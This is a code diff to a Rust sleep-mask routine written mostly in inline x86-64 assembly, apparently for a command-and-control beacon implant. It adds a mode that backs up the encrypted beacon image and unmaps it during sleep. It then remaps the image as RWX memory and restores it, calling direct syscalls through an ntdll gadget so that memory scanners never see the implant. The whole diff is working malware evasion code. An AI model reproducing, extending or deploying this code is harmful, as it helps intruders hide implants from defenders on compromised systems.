@@ -161,6 +161,30 @@ pub unsafe extern "C" fn spt_sleepmask(params: usize) -> usize {
         "xor  rax, rdx",
         "shr  rax, 8",
         "jmp  5b",
+        // ---- mode 1 (stub running from its external copy): backup the
+        // encrypted image, then unmap it - during the sleep the beacon
+        // image does not exist in memory at all (Astral Projection).
+        "cmp  dword ptr [r15 + 0x58], 1",
+        "jne  6f",
+        "push rax",               // rax carries the keystream state
+        "mov  rbx, [r15 + 0x00]", // img_base (src)
+        "mov  rdx, [r15 + 0x50]", // backup (dst)
+        "14:",
+        "cmp  rbx, rdi",
+        "jae  15f",
+        "mov  al, [rbx]",
+        "mov  [rdx], al",
+        "inc  rbx",
+        "inc  rdx",
+        "jmp  14b",
+        "15:",
+        "pop  rax",
+        // NtUnmapViewOfSection(NtCurrentProcess(), img_base)
+        "mov  rcx, -1",
+        "mov  rdx, [r15 + 0x00]",
+        "mov  r10, rcx",
+        "mov  eax, [r15 + 0x5C]",
+        "call r13",
         // ---- sleep: NtDelayExecution(FALSE, &interval) ----------------
         "6:",
         "mov  [rsp], r14",        // local interval
@@ -170,6 +194,39 @@ pub unsafe extern "C" fn spt_sleepmask(params: usize) -> usize {
         "mov  eax, [r15 + 0x28]", // SSN
         "mov  r11, r13",          // gadget: syscall; ret in ntdll
         "call r11",
+        // ---- mode 1: remap the image at its original base and restore
+        // the encrypted backup into it before decrypting.
+        "cmp  dword ptr [r15 + 0x58], 1",
+        "jne  16f",
+        // NtAllocateVirtualMemory(-1, &base, 0, &size, MEM_RESERVE|MEM_COMMIT, RWX)
+        "mov  rdx, [r15 + 0x00]",
+        "mov  [rsp], rdx", // base (in/out)
+        "mov  rdx, [r15 + 0x68]",
+        "mov  [rsp + 0x08], rdx", // size (in/out)
+        "mov  rcx, -1",
+        "lea  rdx, [rsp]",
+        "xor  r8, r8", // ZeroBits = 0
+        "lea  r9, [rsp + 0x08]",
+        "mov  qword ptr [rsp + 0x20], 0x3000", // MEM_RESERVE|MEM_COMMIT
+        "mov  qword ptr [rsp + 0x28], 0x40",   // PAGE_EXECUTE_READWRITE
+        "mov  r10, rcx",
+        "mov  eax, [r15 + 0x60]",
+        "call r13",
+        "mov  [r15 + 0x70], eax", // remap status (caller logs it)
+        "test eax, eax",
+        "jnz  16f", // remap failed: nothing valid to restore into
+        // restore: backup -> [img_base, img_end)
+        "mov  rbx, [r15 + 0x00]",
+        "mov  rdx, [r15 + 0x50]",
+        "17:",
+        "cmp  rbx, rdi",
+        "jae  16f",
+        "mov  al, [rdx]",
+        "mov  [rbx], al",
+        "inc  rbx",
+        "inc  rdx",
+        "jmp  17b",
+        "16:",
         // ---- decrypt: regenerate the identical stream -----------------
         // Same skips as the encrypt (the stream position stays in sync:
         // it advances one step per byte actually ciphered).
@@ -388,5 +445,12 @@ pub unsafe fn build_params(
         orig_protect: orig,
         flip1_status: 0,
         flip2_status: 0,
+        backup: 0,
+        mode: 0,
+        unmap_ssn: 0,
+        alloc_ssn: 0,
+        img_size: (img_end - img_base) as u64,
+        unmap_status: 0,
+        _pad2: 0,
     })
 }
